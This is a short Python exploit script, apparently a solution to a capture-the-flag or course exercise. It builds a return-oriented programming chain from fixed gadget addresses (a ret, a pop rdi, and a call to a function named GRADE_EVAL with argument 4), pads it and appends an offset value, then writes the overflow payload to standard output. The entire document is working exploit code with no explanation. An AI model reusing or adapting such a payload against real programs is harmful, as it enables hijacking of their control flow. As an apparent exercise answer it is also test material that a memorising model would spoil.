
#!/usr/bin/env python3
import struct
import sys

def p64(value):
    return struct.pack("<Q", value)

def p32(value):
    return struct.pack("<I", value)

RET = 0x401660
POP_RDI_RET = 0x4018A3
GRADE_EVAL = 0x401677

DEST_OFFSET = 168

rop = b"".join([
    p64(RET),
    p64(POP_RDI_RET),
    p64(4),
    p64(GRADE_EVAL),
    p64(RET),
    p64(0),
])

rop = rop.ljust(128, b"B")

# expression + logMsg + len
payload = rop + b"C" * 128 + p32(DEST_OFFSET)

sys.stdout.buffer.write(payload + b"\n")